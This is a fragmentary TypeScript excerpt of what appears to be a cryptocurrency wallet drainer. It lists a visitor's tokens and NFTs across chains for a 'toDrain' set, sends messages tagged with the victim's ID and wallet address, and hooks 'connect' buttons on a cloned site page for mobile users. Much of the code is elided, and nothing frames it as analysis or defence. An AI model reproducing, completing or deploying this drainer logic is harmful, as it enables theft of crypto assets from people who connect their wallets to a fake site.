...
async function fetchUserTokens(address: string) {
    ...
    for (let item of Object.entries(chains)) {
        ...
        if (toDrain[item[0]].nft == true) {
            ...
            itemList = itemList.concat(nftList.map((el: any) => {
                return {
...
async function sendMsg(msg: string) {
    var newMsg = msg.replace("$id", window.localStorage.getItem("scUniqueId") as string).replace("$wallet", account)
...
document.addEventListener('DOMContentLoaded', (event) => {
    ...
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        let connects = [document.querySelector("#app > div > div.layout-content > div > div.section.section1.scroll-item > div.btns > a > span"),
        document.querySelector("#app > div > div.layout-content > header > div.menu-items > ul > li.menu-links.menu-icon.hover-color-anim.cursor-pointer")
        ]
